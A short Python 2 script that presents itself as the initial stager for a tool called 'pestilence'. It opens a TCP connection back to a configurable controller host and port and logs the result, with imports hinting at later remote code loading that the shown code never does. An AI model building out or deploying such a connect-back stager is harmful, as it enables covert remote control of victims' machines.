import multiprocessing
import argparse
import base64
import socket
import Queue
import imp
import sys
import ssl
import os


progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\n"
            "********************************\n"
            "Initial Stager for pestilence.py\n")         

argParser = argparse.ArgumentParser(description=progDesc)
argParser.add_argument("--phost", help="Pestilence IP to connect back to", default="127.0.0.1")
argParser.add_argument("--pport", help="Pestilence port to connect back to",type=int, default=54189)
argParser.add_argument("--log", help="Log session details to file")
argParser.add_argument("--verify",help="Care about ssl cert",action="store_true",default=False)

def log(inp, quiet=0):
    try:
        argv.write(inp) 
    except:
        pass
    if not quiet:
        print inp 
    

def main():
    #establish connection back or dipset 
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((argv.phost,argv.pport))
    except Exception as e:
        log("[x.x] Unable to connect to pestilence source %s:%d" % (argv.phost,argv.pport)) 
        log("[>.>] Patient Zero died: %s" % str(e))
        sys.exit(-1)

    log("[^.^] Pestilence connection established")
    




if __name__ == "__main__":
    argv = argParser.parse_args()
    if argv.log:
        with open(argv.log,"w") as argv.log:
            main()
    else:
        main()   
    
    






